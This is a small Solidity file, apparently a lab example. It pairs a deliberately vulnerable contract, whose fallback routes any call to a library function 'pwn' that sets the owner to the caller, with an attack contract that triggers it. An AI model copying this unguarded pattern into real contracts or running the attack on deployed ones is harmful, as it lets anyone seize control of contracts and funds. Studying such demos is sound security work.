// SPDX-License-Identifier: MIT
pragma solidity ^0.8.11;

library NewLib {
    struct Data {
        address owner;
    }

    function pwn(Data storage self) public {
        self.owner = msg.sender;
    }
}
contract NewHackMe {
    address public owner;
    NewLib.Data public lib;

    constructor() {
        owner = msg.sender;
    }

    fallback() external payable {
        NewLib.pwn(lib);
    }
}

contract NewAttack {
    address public hackMe;

    constructor(address _hackMe) {
        hackMe = _hackMe;
    }

    function attack() public {
        hackMe.call(abi.encodeWithSignature("pwn()"));
    }
}